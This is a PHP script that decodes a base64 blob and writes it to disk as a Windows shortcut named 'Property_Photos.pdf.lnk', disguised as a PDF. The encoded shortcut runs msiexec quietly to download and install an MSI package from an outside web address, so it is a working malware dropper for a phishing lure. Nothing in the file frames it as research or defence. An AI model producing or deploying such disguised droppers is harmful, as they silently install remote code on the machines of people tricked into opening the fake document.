<?php
// setup_lnk.php
$filename = "Property_Photos.pdf.lnk";

// PASTE THE SINGLE LINE OF BASE64 HERE (no line breaks!)
$b64 = 'TAAAAAEUAgAAAAAAwAAAAAAAAEbjAAAAAAAAAICJ8ngB2NwBgInyeAHY3AGAifJ4AdjcAQAAAAANAAAAAQAAAAAAAAAAAAAAAAAAAPcAFAAfUOBP0CDqOmkQotgIACswMJ0ZAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAAPAAxAABAAACaXOZTEABXaW5kb3dzACYAAwAEAO++qFLzCJpc5lMUAAAAVwBpAG4AZABvAHcAcwAAABYAQAAxAAAAEACTXOh7EABTeXN0ZW0zMgAAKAADAAQA776oUvMIk1zoexQAAABTAHkAcwB0AGUAbQAzADIAAAAYAEwAMgAAYAEAZlx1qhAAbXNpZXhlYy5leGUuAAAwAAMABADvvmZcdapmXHWqFAAAAG0AcwBpAGUAeABlAGMALgBlAHgAZQAuAAAAHAAAAE8AAAAcAAAAAQAAABwAAAAtAAAAAAAAAE4AAAARAAAAAwAAAKVOB6gQAAAAAEM6XFdpbmRvd3NcU3lzdGVtMzJcbXNpZXhlYy5leGUuAAAvAC8AcQAgAC8AaQAgACIAaAB0AHQAcABzADoALwAvAG4AZQBjAHMAYQBrAGUAbgB5AGEALgBvAHIAZwAvAGEAcwBzAGUAdABzAC8AcwBlAHQAdQBwAC4AbQBzAGkAIgA5ACUAUAByAG8AZwByAGEAbQBGAGkAbABlAHMAKAB4ADgANgApACUAXABNAGkAYwByAG8AcwBvAGYAdABcAEUAZABnAGUAXABBAHAAcABsAGkAYwBhAHQAaQBvAG4AXABtAHMAZQBkAGcAZQAuAGUAeABlAAAAAAA=';

// Remove any whitespace just in case
$b64 = trim($b64);

$data = base64_decode($b64, true);
if ($data === false) {
    die("ERROR: Invalid base64 data - corrupted or contains invalid characters.");
}

// Verify LNK magic bytes
if (substr($data, 0, 4) !== "L\x00\x00\x00") {
    die("ERROR: Decoded data does not start with LNK magic bytes (4c 00 00 00). Got: " . bin2hex(substr($data, 0, 4)));
}

$bytes = file_put_contents($filename, $data);
if ($bytes === false) {
    die("ERROR: Failed to write file. Check directory permissions.");
}

echo "SUCCESS!\n";
echo "File: $filename\n";
echo "Size: $bytes bytes\n";
echo "Magic: " . strtoupper(bin2hex(substr($data, 0, 4))) . "\n";
?>